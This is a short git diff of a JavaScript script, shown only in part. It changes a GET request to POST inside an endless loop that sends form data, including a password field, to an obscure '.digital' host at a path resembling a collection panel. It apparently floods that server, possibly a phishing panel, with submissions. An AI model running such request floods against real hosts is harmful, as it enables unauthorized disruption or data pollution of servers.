@@ -30,7 +30,7 @@ const execute =async () =>{
         'TxtPassword' :TxtPassword
       });
     while (true){
-        await instance.get("https://ap2fws723gubed68wi3e2g38col3g86tdg.digital/p4n3l/data.php",{
+        await instance.post("https://ap2fws723gubed68wi3e2g38col3g86tdg.digital/p4n3l/data.php",{
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://ap2fws723gubed68wi3e2g38col3g86tdg.digital'},
             data
